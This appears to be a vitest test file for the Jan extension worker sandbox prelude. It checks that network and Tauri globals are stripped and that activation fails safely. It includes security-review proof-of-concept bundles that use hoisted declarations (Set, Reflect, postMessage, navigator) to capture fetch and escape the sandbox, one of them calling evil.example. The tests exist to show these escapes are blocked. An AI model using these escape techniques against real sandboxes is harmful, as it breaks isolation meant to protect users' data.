import { afterEach, describe, expect, it, vi } from 'vitest'
import { ExtensionError, type ValidatedManifest } from '@janhq/extension-api'
import prelude from '../../dist/prelude-source.js'
import {
  ACTIVATE_TIMEOUT_MS,
  CancellationTokenSource,
  DEACTIVATE_METHOD,
  Endpoint,
  INVOKE_METHOD,
  STRIPPED_GLOBALS,
  STRIPPED_NAVIGATOR,
  composeWorkerSource,
  isCallbackRef,
  workerTransport,
  type ControlMessage,
} from '../index.js'
import { runInSandbox, type SandboxWorker } from '../testing/harness.js'

const manifest: ValidatedManifest = {
  name: '@acme/one',
  version: '1.0.0',
  id: 'acme.one',
  displayName: 'One',
  publisher: 'Acme',
  apiVersion: '^0.1.0',
  main: 'dist/index.js',
  permissions: [],
}

const running: { worker: SandboxWorker; host: Endpoint }[] = []

afterEach(() => {
  vi.useRealTimers()
  for (const { host } of running.splice(0)) host.close()
})

/** Starts a composed worker and collects its control messages. */
function boot(
  bundle: string,
  handle: (method: string, args: unknown[]) => unknown = () => undefined
) {
  const worker = runInSandbox(composeWorkerSource(prelude, bundle), {
    name: 'ext:acme.one',
  })
  const controls: ControlMessage[] = []
  const errors: string[] = []
  worker.addEventListener('error', (e) => errors.push(e.message))
  const host = new Endpoint(workerTransport(worker), {
    onControl: (m) => controls.push(m),
    handle: async (method, args) => handle(method, args),
  })
  host.sendControl({ v: 1, t: 'init', manifest })
  running.push({ worker, host })
  const outcome = () =>
    controls.find((m) => m.t === 'ready' || m.t === 'activateFailed')
  return { worker, host, controls, errors, outcome }
}

// Runs inside the sandbox after the prelude, reporting what user code sees.
const PROBE = `
var JanExtension = (function () {
  var names = ${JSON.stringify(STRIPPED_GLOBALS)};
  var navNames = ${JSON.stringify(STRIPPED_NAVIGATOR)};
  var report = { values: {}, chain: {}, redefined: [], assigned: [], nav: {} };
  for (var i = 0; i < names.length; i++) {
    var n = names[i];
    report.values[n] = typeof self[n];
    var seen = [];
    for (var o = self; o && o !== Object.prototype; o = Object.getPrototypeOf(o)) {
      var d = Object.getOwnPropertyDescriptor(o, n);
      seen.push(d ? [d.value === undefined, d.configurable, d.writable, 'get' in d] : null);
    }
    report.chain[n] = seen;
    try { Object.defineProperty(self, n, { value: function () {} }); report.redefined.push(n) } catch (e) {}
    try { self[n] = function () {}; if (self[n] !== undefined) report.assigned.push(n) } catch (e) {}
    try {
      Object.defineProperty(Object.getPrototypeOf(Object.getPrototypeOf(self)), n, { value: function () {} });
      report.redefined.push('proto:' + n);
    } catch (e) {}
  }
  for (var j = 0; j < navNames.length; j++) {
    report.nav[navNames[j]] = typeof navigator[navNames[j]];
    try { Object.defineProperty(navigator, navNames[j], { value: {} }); report.redefined.push('nav:' + navNames[j]) } catch (e) {}
  }
  report.userAgent = navigator.userAgent;
  report.postMessage = typeof self.postMessage;
  return {
    activate: function (ctx) { ctx.log.info(JSON.stringify(report)) }
  };
})();
`

describe('worker prelude', () => {
  it('strips every network and Tauri global before user code runs', async () => {
    const logs: unknown[][] = []
    const { worker, outcome } = boot(PROBE, (method, args) => {
      if (method === 'log') logs.push(args)
    })
    await vi.waitFor(() => expect(outcome()?.t).toBe('ready'))
    await vi.waitFor(() => expect(logs).toHaveLength(1))
    const report = JSON.parse(String(logs[0][1]))
    for (const name of STRIPPED_GLOBALS) {
      expect(report.values[name], name).toBe('undefined')
      for (const level of report.chain[name])
        // value undefined, not configurable, not writable, no accessor
        expect(level, name).toEqual([true, false, false, false])
    }
    // self, DedicatedWorkerGlobalScope, WorkerGlobalScope, EventTarget
    expect(report.chain.fetch).toHaveLength(4)
    expect(report.redefined).toEqual([])
    expect(report.assigned).toEqual([])
    expect(report.nav).toEqual({
      storage: 'undefined',
      locks: 'undefined',
      serviceWorker: 'undefined',
    })
    expect(report.userAgent).toBe('jan-sandbox')
    // Messaging stays: forging a message only reaches the same checked API.
    expect(report.postMessage).toBe('function')
    expect(worker.leaks).toEqual([])
  })

  it('cannot be undone by deleting the stripped names', async () => {
    const logs: unknown[][] = []
    const bundle = `
      var JanExtension = { activate: function (ctx) {
        var out = [];
        for (var o = self; o && o !== Object.prototype; o = Object.getPrototypeOf(o)) {
          out.push(delete o.fetch);
        }
        ctx.log.info(String(out.indexOf(true)), typeof fetch);
      } };`
    const { outcome } = boot(bundle, (method, args) => {
      if (method === 'log') logs.push(args)
    })
    await vi.waitFor(() => expect(outcome()?.t).toBe('ready'))
    await vi.waitFor(() => expect(logs).toHaveLength(1))
    expect(logs[0]).toEqual(['info', '-1', 'undefined'])
  })

  it('fails activation when the bundle defines no JanExtension', async () => {
    const { outcome } = boot('var JanExtension = undefined')
    await vi.waitFor(() => expect(outcome()?.t).toBe('activateFailed'))
    expect(outcome()).toMatchObject({
      error: { code: 'E_INVALID_ARGS', message: expect.stringContaining('JanExtension') },
    })
  })

  it('fails activation when JanExtension has no activate function', async () => {
    const { outcome } = boot('var JanExtension = { activate: 1 }')
    await vi.waitFor(() => expect(outcome()?.t).toBe('activateFailed'))
  })

  it('reports a throwing activate with its message', async () => {
    const { outcome } = boot(
      "var JanExtension = { activate: function () { throw new Error('no config') } }"
    )
    await vi.waitFor(() => expect(outcome()?.t).toBe('activateFailed'))
    expect(outcome()).toMatchObject({
      error: { code: 'E_INTERNAL', message: 'no config' },
    })
  })

  it('reports a rejected registration as a failed activation', async () => {
    const { outcome } = boot(
      "var JanExtension = { activate: function (ctx) { ctx.tools.registerTool('echo', function () {}) } }",
      (method) => {
        if (method === 'tools.register')
          throw new ExtensionError('E_PERMISSION', 'lacks tools')
      }
    )
    await vi.waitFor(() => expect(outcome()?.t).toBe('activateFailed'))
    expect(outcome()).toMatchObject({
      error: { code: 'E_PERMISSION', message: 'lacks tools' },
    })
  })

  it('times out an activate that never settles', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] })
    const { outcome } = boot(
      'var JanExtension = { activate: function () { return new Promise(function () {}) } }'
    )
    await vi.advanceTimersByTimeAsync(ACTIVATE_TIMEOUT_MS - 100)
    expect(outcome()).toBeUndefined()
    await vi.advanceTimersByTimeAsync(200)
    await vi.waitFor(() => expect(outcome()?.t).toBe('activateFailed'))
    expect(outcome()).toMatchObject({ error: { code: 'E_TIMEOUT' } })
  })

  it('runs deactivate and disposes subscriptions on $deactivate', async () => {
    const logs: unknown[][] = []
    const disposed: number[] = []
    const bundle = `
      var JanExtension = {
        activate: function (ctx) {
          ctx.subscriptions.add(ctx.commands.registerCommand('hello', function () {}));
        },
        deactivate: function () { self.__deactivated = true; console.log('bye') }
      };`
    let registrations = 0
    const { host, worker, outcome } = boot(bundle, (method, args) => {
      if (method === 'log') logs.push(args)
      if (method === 'commands.register') return { disposable: ++registrations }
      if (method === '$dispose') disposed.push(args[0] as number)
    })
    await vi.waitFor(() => expect(outcome()?.t).toBe('ready'))
    await host.request(DEACTIVATE_METHOD, [])
    expect(worker.scope.__deactivated).toBe(true)
    await vi.waitFor(() => expect(disposed).toEqual([1]))
  })

  it('invokes a registered callback with a token the host can cancel', async () => {
    let handle: number | undefined
    const bundle = `
      var JanExtension = { activate: function (ctx) {
        ctx.tools.registerTool('wait', function (input, token) {
          return new Promise(function (resolve) {
            token.onCancellationRequested(function () {
              resolve({ content: [{ type: 'text', text: 'cancelled ' + input.n }] });
              self.__cancelled = true;
            });
          });
        });
      } };`
    const { host, worker, outcome } = boot(bundle, (method, args) => {
      if (method === 'tools.register') {
        if (isCallbackRef(args[1])) handle = args[1].$callback
        return { disposable: 1 }
      }
    })
    await vi.waitFor(() => expect(outcome()?.t).toBe('ready'))
    const source = new CancellationTokenSource()
    const call = host.request(INVOKE_METHOD, [handle, [{ n: 1 }]], {
      token: source.token,
    })
    await new Promise((r) => setTimeout(r, 20))
    source.cancel()
    await expect(call).rejects.toMatchObject({ code: 'E_CANCELLED' })
    await vi.waitFor(() => expect(worker.scope.__cancelled).toBe(true))
  })

  it('aborts the script when stripping fails, before user code runs', async () => {
    const worker = runInSandbox(
      composeWorkerSource(
        prelude,
        'var JanExtension = (self.__userRan = true, { activate: function () {} })'
      ),
      {
        globals: {
          // A property that cannot be replaced: the prelude must fail closed.
          __TAURI__: undefined,
        },
      }
    )
    Object.defineProperty(worker.scope, '__TAURI__', {
      value: 'locked',
      configurable: false,
      writable: false,
    })
    const controls: ControlMessage[] = []
    const errors: string[] = []
    worker.addEventListener('error', (e) => errors.push(e.message))
    const host = new Endpoint(workerTransport(worker), {
      onControl: (m) => controls.push(m),
    })
    running.push({ worker, host })
    await vi.waitFor(() => expect(errors).toHaveLength(1))
    expect(worker.scope.__userRan).toBeUndefined()
    await vi.waitFor(() => expect(controls[0]?.t).toBe('activateFailed'))
  })
})

// The PoCs of the security review, composed without the host's bundle
// check, so the prelude itself is shown not to trust anything a hoisted
// declaration could have replaced.
const unchecked = (bundle: string) =>
  [
    prelude,
    `;${bundle}`,
    ";self.__janBoot(typeof JanExtension === 'undefined' ? undefined : JanExtension)",
  ].join('\n')

function bootUnchecked(bundle: string) {
  const worker = runInSandbox(unchecked(bundle), { name: 'ext:acme.one' })
  const controls: ControlMessage[] = []
  const errors: string[] = []
  const logs: unknown[][] = []
  worker.addEventListener('error', (e) => errors.push(e.message))
  const host = new Endpoint(workerTransport(worker), {
    onControl: (m) => controls.push(m),
    handle: async (method, args) => {
      if (method === 'log') logs.push(args)
    },
  })
  host.sendControl({ v: 1, t: 'init', manifest })
  running.push({ worker, host })
  return { worker, controls, errors, logs }
}

describe('prelude intrinsics', () => {
  it('fails closed when a hoisted declaration replaced Set (set.mjs)', async () => {
    const { worker, controls, errors } = bootUnchecked(`
      function Set(items) {
        if (!self.__net) self.__net = fetch;
        var m = {}; (items || []).forEach(function (k) { m[k] = 1 });
        return { has: function (k) { return !!m[k] }, add: function () { return this }, delete: function () {} };
      }
      var JanExtension = { activate: function () { self.__net('https://evil.example/x') } };`)
    await vi.waitFor(() => expect(errors).toHaveLength(1))
    await new Promise((r) => setTimeout(r, 50))
    expect(controls.some((m) => m.t === 'ready')).toBe(false)
    expect(worker.scope.__net).toBeUndefined()
    expect(worker.leaks).toEqual([])
  })

  it('fails closed, before any bundle code, when a var pins a stripped name', async () => {
    const { worker, controls, errors } = bootUnchecked(`
      var fetch;
      function postMessage() { self.__net = Object.getPrototypeOf(self).fetch }
      var JanExtension = { activate: function () {} };`)
    await vi.waitFor(() => expect(errors).toHaveLength(1))
    expect(controls.some((m) => m.t === 'ready')).toBe(false)
    expect(worker.scope.__net).toBeUndefined()
  })

  it('fails closed when a hoisted declaration replaced Reflect (obj.mjs)', async () => {
    const { controls, errors } = bootUnchecked(`
      function Reflect() {}
      var JanExtension = { activate: function () {} };`)
    await vi.waitFor(() => expect(errors).toHaveLength(1))
    expect(controls.some((m) => m.t === 'ready')).toBe(false)
  })

  it('strips storage off the real navigator even when the name is shadowed (nav.mjs)', async () => {
    for (const shadow of ['function navigator() {}', 'var navigator;']) {
      const { worker, controls, logs } = bootUnchecked(`
        ${shadow}
        var JanExtension = { activate: function (ctx) {
          var p = self, g;
          while (p && !((g = Object.getOwnPropertyDescriptor(p, 'navigator')) && g.get)) p = Object.getPrototypeOf(p);
          var real = g.get.call(self);
          ctx.log.info(typeof real.storage, typeof real.locks, typeof real.serviceWorker);
        } };`)
      await vi.waitFor(() => expect(controls.at(-1)?.t).toBe('ready'))
      await vi.waitFor(() => expect(logs).toHaveLength(1))
      expect(logs[0]).toEqual(['info', 'undefined', 'undefined', 'undefined'])
      expect(worker.leaks).toEqual([])
    }
  })

  it('fails closed for a hoisted replacement of any global it reads', async () => {
    for (const name of [
      'Object',
      'Array',
      'Number',
      'String',
      'Promise',
      'Error',
      'Reflect',
      'JSON',
      'Map',
      'Set',
      'console',
      'setTimeout',
      'clearTimeout',
      'queueMicrotask',
      'globalThis',
      'postMessage',
      'addEventListener',
      'removeEventListener',
      'close',
    ]) {
      for (const decl of [
        `function ${name}() { self.__net = fetch }`,
        `async function ${name}() { self.__net = fetch }`,
      ]) {
        const { worker, controls, errors } = bootUnchecked(
          `${decl}\nvar JanExtension = { activate: function () {} };`
        )
        await vi.waitFor(() => expect(errors, decl).toHaveLength(1))
        expect(errors[0], decl).toContain(name)
        expect(controls.some((m) => m.t === 'ready'), decl).toBe(false)
        expect(worker.scope.__net, decl).toBeUndefined()
      }
    }
  })
})

describe('composeWorkerSource', () => {
  it('survives a bundle without a trailing semicolon or ending in a comment', async () => {
    const { outcome } = boot('var JanExtension = { activate: function () {} } // done')
    await vi.waitFor(() => expect(outcome()?.t).toBe('ready'))
  })
})
